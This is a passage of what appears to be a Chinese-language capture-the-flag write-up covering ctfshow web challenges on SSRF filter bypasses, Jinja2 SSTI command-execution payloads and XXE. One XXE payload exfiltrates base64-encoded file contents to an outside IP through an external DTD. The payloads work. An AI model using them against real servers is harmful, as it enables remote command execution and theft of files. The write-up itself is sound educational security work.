class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$ x [&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;= 5))&#123;</span><br><span class="line">    #限制访问的域名长度</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; hacker</span><br></pre></td></tr></table></figure>

<p><code>url=http://127.1/flag.php</code></p>
<p>linux 中 0 指向本机地址</p>
<p>payload： <code>url=http://0/flag.php</code></p>
<h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$ x [&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;= 3))&#123;</span><br><span class="line">    #继续限制</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; hacker</span><br></pre></td></tr></table></figure>

<p>代码块</p>
<p><code>url=http://0/flag.php</code></p>
<h3 id="未复现-web357"><a href="#未复现-web357" class="headerlink" title="(未复现)web357"></a>(未复现)web357</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$ip = gethostbyname($ x [&#x27;host&#x27;]); </span><br><span class="line">echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br &gt;&#x27;;</span><br><span class="line">if(! filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    die(&#x27;ip!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo file_get_contents($_POST[&#x27;url&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;scheme&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; scheme</span><br></pre></td></tr></table></figure>




<blockquote>
<p><code>filter_var</code> 函数来验证 IP 地址的有效性，并且排除了私有 IP 范围（0.0.0.0&#x2F;8、172.16.0.0&#x2F;12 和 192.168.0.0&#x2F;16）和保留 IP 范围(0.0.0.0&#x2F;8 和 169.254.0.0&#x2F;16。)。<br>用 DNS rebind 进行 DNS 重绑定攻击，思路：第一次访问，域名第一次解析是 127.0.0.1，第二次解析是 104.56.61.24。第二次访问的时候，域名第一次解析是 104.56.61.24，第二次解析是 127.0.0.1。</p>
<p>用 <a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">DNS rebind</a> 进行 DNS 重绑定攻击，<strong>思路：第一次访问，域名第一次解析是 127.0.0.1，第二次解析是 104.56.61.24。第二次访问的时候，域名第一次解析是 104.56.61.24，第二次解析是 127.0.0.1。</strong></p>
</blockquote>
<blockquote>
<p><code>gethostbyname()</code> 是 PHP 中的一个函数，用于获取指定主机名的 IP 地址。这个函数可以通过给定主机名，返回相应主机的 IPv4 地址。如果主机名无效，则函数返回主机名本身</p>
<p>在 PHP 中，filter_var()函数结合 FILTER_VALIDATE_IP 过滤器可以用来验证一个 IP 地址的有效性。在这个例子中，FILTER_FLAG_NO_PRIV_RANGE 和 FILTER_FLAG_NO_RES_RANGE 是额外的标志，用于指定不接受私有 IP 地址和保留 IP 地址。</p>
<p>FILTER_VALIDATE_IP：指定要验证的过滤器类型，用于验证 IP 地址。<br>FILTER_FLAG_NO_PRIV_RANGE：指示 filter_var()函数不接受私有 IP 地址。私有 IP 地址范围包括：<br>10.0.0.0 至 10.255.255.255<br>172.16.0.0 至 172.31.255.255<br>192.168.0.0 至 192.168.255.255<br>FILTER_FLAG_NO_RES_RANGE：指示 filter_var()函数不接受保留 IP 地址。保留 IP 地址范围包括：<br>0.0.0.0 至 0.255.255.255<br>169.254.0.0 至 169.254.255.255<br>127.0.0.0 至 127.255.255.255<br>224.0.0.0 至 239.255.255.255<br>利用 302 重定向访问 127.0.0.1 的原理获得 flag 绕过过滤</p>
<p>302 重定向是 HTTP 状态代码之一，表示临时性的重定向。当服务器收到客户端的请求后，如果需要将请求的资源临时重定向到另一个 URL，但未来可能会恢复到原始 URL 时，就会返回 302 状态码。这意味着客户端应该继续使用原始 URL 进行后续请求，因为重定向是暂时的。302 重定向常用于网站维护、临时性更改或者流量控制等场景。</p>
</blockquote>
<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123;</span><br><span class="line">    echo file_get_contents($url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>url=http://ctf.:passwd@127.0.0.1/flag.php#show</code></p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><p>![img](file:&#x2F;&#x2F;&#x2F;C:\Users\111\Documents\Tencent Files\2645958615\nt_qq\nt_data\Pic\2025-04\Ori\250ea6921f44142c235ad251ca163526.png)</p>
<h3 id="web362-过滤部分数字"><a href="#web362-过滤部分数字" class="headerlink" title="web362 过滤部分数字"></a>web362 过滤部分数字</h3><p>这个题是屏蔽了数字 2 和 3，那么思路可以分为两类，硬要用 os 类那就绕过 2 和 3，或者用其他的类。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[11*11%2b+11].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat+/flag&#x27;).read()&#125;&#125;</span><br><span class="line">用&lt;class &#x27;warnings.catch_warnings&#x27;&gt;  执行命令：</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[185].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">用 subprocess.Popen()：</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[407](&quot;cat /flag&quot;,shell=True,stdout=-1).communicate()[0]&#125;&#125;</span><br><span class="line">使用_frozen_importlib_external.FileLoader 进行读取 flag 内容：</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[94].get_data(0,&#x27;/flag&#x27;)&#125;&#125;</span><br><span class="line">                                                         文件路径</span><br><span class="line">使用 lipsum 方法。这个是 flask 的内置方法，自带 os 模块：             </span><br><span class="line">&#123;&#123;lipsum.__globals__.get(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web363-单双引号””‘’"><a href="#web363-单双引号””‘’" class="headerlink" title="web363 单双引号””‘’"></a>web363 单双引号””‘’</h3><p>过滤了单引号，把””变成（）,用 request.args.a</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[11*11%2b+11].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>

<h3 id="web364-args"><a href="#web364-args" class="headerlink" title="web364 args"></a>web364 args</h3><p>过滤 args，可以用 cookies</p>
<blockquote>
<p>过滤 args，可以用 cookies<br><code>?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.cookies.p](request.cookies.param).read()&#125;&#125;</code><br>cookies<br><code>Cookie: p=popen; param=cat /flag</code></p>
</blockquote>
<p>request.values.a 读取 get&#x2F;post 方式里 a 的值</p>
<p>request.args.a 读取 get 方式里 a 的值</p>
<p>request.form.a 读取 post 方式里 a 的值</p>
<p>request.cookies.a 读取 cookie 里 a 的值</p>
<h3 id="web365-方括号"><a href="#web365-方括号" class="headerlink" title="web365 方括号[]"></a>web365 方括号[]</h3><blockquote>
<p>过滤了方括号，可以用__getitem__绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure></blockquote>
<blockquote>
<p>三种方法，但都需要用到 python 魔术方法 getitem</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方法一：&#123;%set char=config.**class**.**init**.**globals**.**builtins**.chr%&#125;&#123;&#123;().**class**.**base**.**subclasses**().**getitem**(132).**init**.**globals**.popen(char(108)%2bchar(115)).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">方法二： name=&#123;&#123;().class.base.subclasses().getitem(132).init.globals.getitem(request.cookies.x1)(request.cookies.x2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">然后将 cookie 写入 Cookie: x1=popen; x2=cat /flag</span><br><span class="line"></span><br><span class="line">方法三： 使用 subprocess.Popen 类 &#123;&#123;().**class**.**mro**.**getitem**(1).**subclasses**().**getitem**(407)(request.values.a,shell=True,stdout=-1).communicate().**getitem**(0)&#125;&#125;&amp;a=cat /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>
<h3 id="web366-下划线"><a href="#web366-下划线" class="headerlink" title="web366 下划线_"></a>web366 下划线_</h3><blockquote>
<p>过滤了下划线，先换一个更简单获取 popen 方法的类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.a).read()&#125;&#125;&amp;a =cat /flag</span><br></pre></td></tr></table></figure>

<p>再利用 filters 中的 attr 来过滤下划</p>
<p>具体介绍可以看一下官方文档 <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/#attr">https://jinja.palletsprojects.com/en/2.11.x/templates/#attr</a></p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure></blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在 `?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__` 这个恶意 payload 里：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`lipsum` 是一个对象，`request.values.b` 的值为 `&quot;__globals__&quot;` ，`attr(request.values.b)` （等价于 `attr(&quot;__globals__&quot;)` ）表示通过 `attr` 操作（类似 `getattr` 函数）去获取 `lipsum` 对象的 `__globals__` 属性。这里的 `|` 是模板引擎（比如 Jinja2 模板引擎）里的过滤器操作符，`lipsum | attr(request.values.b)` 就是对 `lipsum` 对象应用 `attr` 过滤器（本质是调用类似 `getattr` 这样获取属性的操作）来得到 `lipsum` 对象的 `__globals__` 属性值，它是一个包含了全局变量的字典。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后 `(lipsum | attr(request.values.b)).os` 是从这个 `__globals__` 字典里取出 `os` 模块对象（因为 `os` 模块通常会被包含在 `__globals__` 里） ，接着 `(lipsum | attr(request.values.b)).os.popen(request.values.a)` 调用 `os` 模块的 `popen` 函数去执行 `request.values.a` 所传入的命令（这里是 `cat /flag` ），最后 `.read()` 读取命令执行的输出结果。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`__globals__` 是 Python 中对象的一个特殊属性（属性名是固定的 `__globals__` ），而 `globals` 是 Python 内置函数，功能是返回当前全局符号表的字典。两者概念不同，并且在这个恶意 payload 里主要是获取对象的 `__globals__` 属性来达到恶意利用 `os` 模块执行命令的目的。</span><br></pre></td></tr></table></figure>



<h3 id="web367-os"><a href="#web367-os" class="headerlink" title="web367 os"></a>web367 os</h3><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了 os，可以通过 get 来获取</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="web368-request"><a href="#web368-request" class="headerlink" title="web368 request"></a>web368 request</h3><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了 request，但是是再&#123;&#123;&#125;&#125;中过滤了 request，没有在&#123;% %&#125;过滤 request</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="web369-request"><a href="#web369-request" class="headerlink" title="web369 request"></a>web369 request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="comment"># php://input 是 PHP 中用于直接读取 HTTP 请求体（Request Body） 的流。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="comment"># 允许加载并解析外部实体和 DTD，直接触发 XXE。</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打开 bp 抓包，修改请求方法，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [                     &lt;!-- 定义 DTD，声明根元素为 test（实际未使用） --&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; </span><br><span class="line">    &lt;!-- 定义一个名为 xxe 的外部实体 file:// 是 URI 协议的一种，表示访问本地文件系统（或网络共享文件） --&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;z3r4y&gt;                            </span><br><span class="line">    &lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;        &lt;!-- 引用 xxe 实体，尝试读取 /flag 文件 --&gt;</span><br><span class="line">&lt;/z3r4y&gt;</span><br></pre></td></tr></table></figure>

<p>file:&#x2F;&#x2F;&#x2F;flag&#96; 的结构</p>
<ul>
<li><strong>分解</strong>：<ul>
<li><p><code>file://</code>：协议标识符，表示访问本地文件。</p>
</li>
<li><p><code>/flag</code>：文件路径，表示从根目录开始的绝对路径（Unix&#x2F;Linux 系统）。</p>
<ul>
<li><strong>三个斜杠 <code>/</code> 的含义</strong>：<ul>
<li><code>file://</code> 后的第一个 <code>/</code> 是 URI 路径分隔符。</li>
<li>完整的 <code>file:///flag</code> 实际上是 <code>file:// + /flag</code>，即访问根目录下的 <code>flag</code> 文件。</li>
<li>在 Windows 中可能需要写成 <code>file:///C:/flag</code>（注意盘符 <code>C:</code>）。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);   <span class="comment">// 开启外部实体加载（危险，可能被利用 XXE）</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);   <span class="comment">// 从 HTTP 请求体读取用户提交的数据（一般是 XML）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;   <span class="comment">// 如果有提交的 XML 数据</span></span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();   <span class="comment">// 创建一个 DOMDocument 对象，用来解析 XML</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);   <span class="comment">// 解析 XML，允许实体替换（NOENT）和 DTD 加载（DTDLOAD）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和上一题相比少了</p>
<p><code>    $creds = simplexml_import_dom($dom);   // 把DOM对象转成SimpleXML对象，方便访问节点</code></p>
<p>没有继续取节点（比如 <code>$dom-&gt;getElementsByTagName()</code>），所以代码执行到这里就结束了，什么数据都没用到，所以没有回显。所以我们考虑数据外带（out of band）。访问一个请求，把数据加到请求上。</p>
<p>所以我们要发给网页的dtd上写“去把flag打包好”“去访问这个ip上的dtd”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE hacker[</span><br><span class="line">    &lt;!ENTITY  % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY  % myurl SYSTEM &quot;http://ip:9999/test.dtd&quot;&gt;</span><br><span class="line">    %myurl;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">1</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>



<p>在服务器上的dtd写”定义一个send变量”“使用send变量，把打包好的flag发给这个ip”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://47.122.71.42:9999/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>



<p>在vps上监听：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9999</span><br></pre></td></tr></table></figure>

<p>这里我第一次用的是nc -lvvp 9999，很不幸的失败了，猜想可能是nc只是一个 <strong>裸 TCP 监听</strong>，如果请求很快或者是 HTTP&#x2F;1.0，<strong>可能会连接一次就断开</strong>。<code>python3 -m http.server 80</code> 是一个 <strong>完整 HTTP 服务</strong>，它能正确响应 HTTP GET 请求，发送 200 OK，目标服务器收到正常响应后，整个请求流程会成功完成。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1756895243450-b7deaadb-4900-4839-9748-31203a663bf0.png?x-oss-process=image/format,webp" alt="image.png"></p>
<h3 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h3><p>相比于上一题源码多了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是上题本来就没有这个，这里到底想考什么呢？也许是空格绕过，多打一个空格在<code>?xml</code>和<code>version</code>之间就好了。</p>
<h3 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了一个大小写 xml头声明不强制要求，可有可无</p>
<h3 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了一个http</p>
<p>计算机只能处理0和1，所以文字符号必须转换成字节才能存储或传输，把字符转换成字节的规则叫做字符编码。</p>
<p>PHP 的 <code>preg_match</code> 工作在 <strong>字符层面（char）</strong>，也就是byte-to-char，先把字节解析成字符，再当作普通 ASCII 字符去匹配。</p>
<p>UTF-16这个编码的英文字符在内存里占两个字节，例如字符 <code>h</code>：</p>
<ul>
<li>ASCII &#x2F; UTF-8 → <code>0x68</code></li>
<li>UTF-16 → <code>0x68 0x00</code>（低字节在前，或大端字节序 <code>0x00 0x68</code>）</li>
</ul>
<p>所以字母 <code>http</code> 在 UTF-16 中存储可能是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h      t      t      p</span><br><span class="line">0x68 0x00 0x74 0x00 0x74 0x00 0x70 0x00</span><br></pre></td></tr></table></figure>

<p>正则 <code>/http/i</code> 期望看到连续的 ASCII <code>&#39;h&#39; &#39;t&#39; &#39;t&#39; &#39;p&#39;</code>（单字节），结果每个字母之间都有 <code>0x00</code> → 匹配失败</p>
<blockquote>
